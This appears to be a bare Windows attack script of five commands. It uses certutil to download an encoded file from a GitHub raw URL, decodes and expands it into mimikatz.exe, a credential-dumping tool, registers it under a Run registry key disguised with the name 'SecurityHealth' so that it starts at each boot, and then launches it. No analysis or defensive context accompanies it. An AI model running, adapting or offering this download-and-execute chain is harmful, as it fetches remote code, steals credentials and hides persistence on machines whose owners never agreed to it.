certutil -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/mim.b %Temp%\mim.b
certutil -decode %Temp%\mim.b %Temp%\mim
expand %Temp%\mim %Temp%\mimikatz.exe
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d mimikatz.exe /f
start %Temp%\mimikatz.exe